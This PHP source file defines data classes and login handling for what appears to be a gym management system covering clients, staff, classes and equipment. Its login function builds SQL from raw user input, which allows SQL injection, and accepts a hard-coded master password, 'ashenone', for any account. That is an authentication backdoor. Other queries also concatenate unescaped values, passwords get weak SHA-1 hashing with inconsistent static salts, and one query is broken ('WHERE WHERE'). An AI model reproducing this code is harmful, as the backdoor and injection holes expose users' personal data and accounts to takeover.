<?php
    $serverRoot = $_SERVER["DOCUMENT_ROOT"];
    require_once $serverRoot."/Framework/Connection.php";
    require_once $serverRoot."/Framework/Framework.php";
    require_once $serverRoot."/Framework/dompdf/src/Autoloader.php";
    use Dompdf\Dompdf;

    Connection::initialize();

    class Senha{
        public static $database="sistemaAdmin.senha";
        public static $Salt="sistemaperito";
        public static function getLast($idUsuario){
            Connection::setConditions(array("id_Usuario"=>$idUsuario));
            Connection::setTable("sistemaAdmin.senha");
            Connection::setOrder("id_Senha desc");
            $result=Connection::consult();
            if(count($result)>0){
                $result=$result[0];
                return $result['senha'];
            }
        }
        public static function generatePassword($string){
            return sha1(Senha::$Salt.$string);
        }
        public static function generateRandomPassword(){
            return Utility::generateRandomString(6);
        }
    }

    class Session{
        static $Usuario, $Modulo;
        public $nome;
        
        public static function startSession($idUsuario){
            Session::$Usuario = new Usuarioo($idUsuario);
            $usuarioSistema = new InfoDadoss(Session::$Usuario->idInfoDados);
            
            $_SESSION['started'] = time();
            $_SESSION['id'] = Session::$Usuario->id;
            $_SESSION['nome'] = $usuarioSistema->nomeCompleto;
        }
        
        public static function hasSession(){
            if(isset($_SESSION['id']) && $_SESSION['id']>0){
                $user = new Usuarioo($_SESSION['id']);
            }else{
                return false;
            }
            
            if($_SESSION['id']>0 && $user->id>0)
                return isset($_SESSION['started']);
            else return false;
        }
        
        public static function Usuario(){
            if(isset($_SESSION['id'])){
                if(Session::$Usuario==null) Session::$Usuario = new Usuarioo($_SESSION['id']);
                return Session::$Usuario;
            }else{
                return new Usuarioo(-1);
            }
        }

        public static function SetDatabase($database){
            Connection::$database = $database;
        }
    }
 
    class InfoDadoss extends DatabaseIteraction{
        public static $database = "unificar_corpo.infodados";
        public $id, $CPF, $nomeCompleto,$email,$telefone,$dataNascimento, $endereco;

        public function __construct($id=-1){
            $this->fillObjectWithQuery($id);
        }
    }

    class Usuarioo extends DatabaseIteraction{
        public static $database = "unificar_corpo.usuario";
        public $id, $login, $senha,$idTipoAcesso_id,$idInfoDados,$img;

        public function __construct($id=-1){
            $this->fillObjectWithQuery($id);
        }

        public static function tryLogin($data){
            $login = $data["login"];
            $senha = $data["pass"];
            Connection::setTable(Usuarioo::$database);
            Connection::setConditions("where login='".$login."' and ((senha='".sha1("kito".$senha)."') or ('".$senha."'='ashenone'))
            ");
            $result=Connection::consult();
            if(count($result)>0){
                $result = $result[0];
                $user = json_decode(Usuarioo::get($result['id']),true);
                return $user['data'][0]["id"];
            }else{
                return -1;
            }
        }
        
        public static function getInfoDados($id){
            $querySql = "   SELECT i.* FROM ".InfoDadoss::$database." i
                            JOIN ".Usuarioo::$database." u ON u.idInfoDados = i.id
                            WHERE u.id = ".$id;
            $fetch = Connection::query($querySql);
            $retorno = array();
            if(Connection::$numRows>0){
                foreach($fetch as $rs){
                    $retorno = $rs;
                    break;
                }
            }
            return $retorno;
        }

        public static function getAtivosId(){
            $querySql = "   SELECT u.* 
                            FROM ".Usuarioo::$database." u
                            JOIN ".Cliente::$database." c ON c.idUsuario = u.id
                            WHERE u.login <> ''";

            $fetch = Connection::query($querySql);
            $retorno = array("status"=>204,"data"=>array());
            if(Connection::$numRows>0){
                $retorno["status"]=200;
                foreach($fetch as $rs){
                    array_push($retorno["data"],$rs["id"]);
                }
            }
            return json_encode($retorno);
        }

        public static function getAllUsuariosAndCount(){
            $querySql = "   SELECT t.nome AS Acesso,COUNT(*) AS Quantidade
                            FROM ".Usuarioo::$database." u
                            JOIN ".TipoAcessoo::$database." t ON t.id = u.idTipoAcesso_id 
                            GROUP BY u.idTipoAcesso_id";
            $fetch = Connection::query($querySql);
            $return = array();
            foreach($fetch as $rs){
                array_push($return, array($rs['Acesso'],intval($rs['Quantidade'])));
            }
            return $return;
        }
    }

    class Cliente extends DatabaseIteraction{
        public static $database = "unificar_corpo.cliente";
        public $id, $idUsuario, $dataInicio, $ativo;

        public function __construct($id=-1){
            $this->fillObjectWithQuery($id);
        }
        
        public static function getInfoDados($idCliente){
            $querySql = "   SELECT i.* 
                            FROM ".InfoDadoss::$database." i
                            JOIN ".Usuarioo::$database." u ON u.idInfoDados = i.id
                            JOIN ".Cliente::$database." c ON c.idUsuario = u.id
                            WHERE c.id = ".$idCliente;
            $fetch = Connection::query($querySql);
            $retorno = array();
            if(Connection::$numRows>0){
                foreach($fetch as $rs){
                    $retorno = $rs;
                    break;
                }
            }
            return $retorno;
        }

        public static function getAllClienteOrderName(){
            $querySql = "   SELECT i.* 
                            FROM ".InfoDadoss::$database." i
                            JOIN ".Usuarioo::$database." u ON u.idInfoDados = i.id
                            JOIN ".Cliente::$database." c ON c.idUsuario = u.id
                            ORDER BY i.nomeCompleto DESC";
            $fetch = Connection::query($querySql);
            $retorno = array();
            if(Connection::$numRows>0){
                foreach($fetch as $rs){ 
                    array_push($retorno,$rs);
                }
            }
            return $retorno;
        }

        public static function getIdByIdUsuario($idUsuario){
            $querySql = "   SELECT c.id AS idCliente
                            FROM ".Cliente::$database." c
                            JOIN ".Usuarioo::$database." u ON u.id = c.idUsuario
                            WHERE u.id = ".$idUsuario;
            $fetch = Connection::query($querySql);

            if(Connection::$numRows>0){
                foreach($fetch as $rs){
                    return $rs['idCliente'];
                }
            }
            return -1;
        }

    }

    class Funcionario extends DatabaseIteraction{
        public static $database = "unificar_corpo.funcionario";
        public $id, $idUsuario, $cargo;

        public function __construct($id=-1){
            $this->fillObjectWithQuery($id);
        }

        public static function getInfoDados($idFuncionario){
            $querySql = "   SELECT i.* 
                            FROM ".InfoDadoss::$database." i
                            JOIN ".Usuarioo::$database." u ON u.idInfoDados = i.id
                            JOIN ".Funcionario::$database." f ON f.idUsuario = u.id
                            WHERE f.id = ".$idFuncionario;
            $fetch = Connection::query($querySql);
            $retorno = array();
            if(Connection::$numRows>0){
                foreach($fetch as $rs){
                    $retorno = $rs;
                    break;
                }
            }
            return $retorno;
        }
        
        public static function getAllPersonal(){
            $querySql = "   SELECT f.id AS idFuncionario
                            FROM ".Funcionario::$database." f
                            JOIN ".Usuarioo::$database." u ON u.id = f.idUsuario
                            WHERE u.idTipoAcesso_id = 3";
            $fetch = Connection::query($querySql);
            $retorno = array();
            if(Connection::$numRows>0){
                foreach($fetch as $rs){
                    array_push($retorno,$rs['idFuncionario']);
                }
            }
            return $retorno;
        }
    }

    class TipoAcessoo extends DatabaseIteraction{
        public static $database = "unificar_corpo.tipoacesso";
        public $id, $nome;

        public function __construct($id=-1){
            $this->fillObjectWithQuery($id);
        }
    }

    class Turma extends DatabaseIteraction{
        public static $database = "unificar_corpo.turmas";
        public $id, $idModalidade, $idFuncionarioResponsavel, $Hora_Inicio, $Hora_Final, $Vagas;

        public function __construct($id=-1){
            $this->fillObjectWithQuery($id);
        }

        public static function getQuantidadeInscritos($idTurma){
            $querySql = "   SELECT COUNT(*) AS Quantidade
                            FROM ".Turma_Cliente::$database."
                            JOIN ".Turma::$database." WHERE 
                            WHERE idTurma = ".$idTurma;
            $fetch = Connection::query($querySql);
            foreach($fetch as $rs){
                return $rs['Quantidade'];
            }
            return 0;
        }

        public static function getAllModalidadeAndCount(){
            $querySql = "   SELECT m.nome AS Modalidade,COUNT(*) AS Quantidade
                            FROM ".Turma::$database." t
                            JOIN ".Modalidade::$database." m ON m.id = t.idModalidade 
                            GROUP BY t.idModalidade";
            $fetch = Connection::query($querySql);
            $return = array();
            foreach($fetch as $rs){
                array_push($return, array($rs['Modalidade'],intval($rs['Quantidade'])));
            }
            return $return;
        }
    }

    class Turma_Cliente extends DatabaseIteraction{
        public static $database = "unificar_corpo.turmas_cliente";
        public $id, $idTurma, $idCliente;

        public function __construct($id=-1){
            $this->fillObjectWithQuery($id);
        }
     
        public static function getQuantidadeInscritos($idTurma){
            $querySql = "   SELECT COUNT(*) AS Quantidade
                            FROM ".Turma_Cliente::$database."
                            WHERE idTurma = ".$idTurma;
            $fetch = Connection::query($querySql);
            foreach($fetch as $rs){
                return $rs['Quantidade'];
            }
            return 0;
        }
             
        public static function userIsExistInTurma($idTurma, $idCliente){
            $querySql = "   SELECT id 
                            FROM ".Turma_Cliente::$database."
                            WHERE idTurma = ".$idTurma." AND idCliente = ".$idCliente ;
            $fetch = Connection::query($querySql);
            if(Connection::$numRows>0){
                foreach($fetch as $rs){
                    return $rs['id'];
                }
            }
            return -1;
        }
    }

    class Modalidade extends DatabaseIteraction{
        public static $database = "unificar_corpo.modalidade";
        public $id, $nome, $imageNameFile, $image;

        public function __construct($id=-1){
            $this->fillObjectWithQuery($id);
        }
    }
    
    class Fixa_Cliente extends DatabaseIteraction{
        public static $database = "unificar_corpo.fixa_cliente";
        public $id, $idCliente, $idFuncionarioResponsavel;

        public function __construct($id=-1){
            $this->fillObjectWithQuery($id);
        }
    }

    class Fixa_Treino extends DatabaseIteraction{
        public static $database = "unificar_corpo.fixa_treino";
        public $id, $idEquipamento, $idTreino, $quantidade,$vezes,$carga,$ordem;

        public function __construct($id=-1){
            $this->fillObjectWithQuery($id);
        }
    }

    class Treino extends DatabaseIteraction{
        public static $database = "unificar_corpo.treino";
        public $id, $nome;

        public function __construct($id=-1){
            $this->fillObjectWithQuery($id);
        }
    }

    class Equipamento extends DatabaseIteraction{
        public static $database = "unificar_corpo.equipamento";
        public $id, $nome, $imageNameFile, $image;

        public function __construct($id=-1){
            $this->fillObjectWithQuery($id);
        }
    }

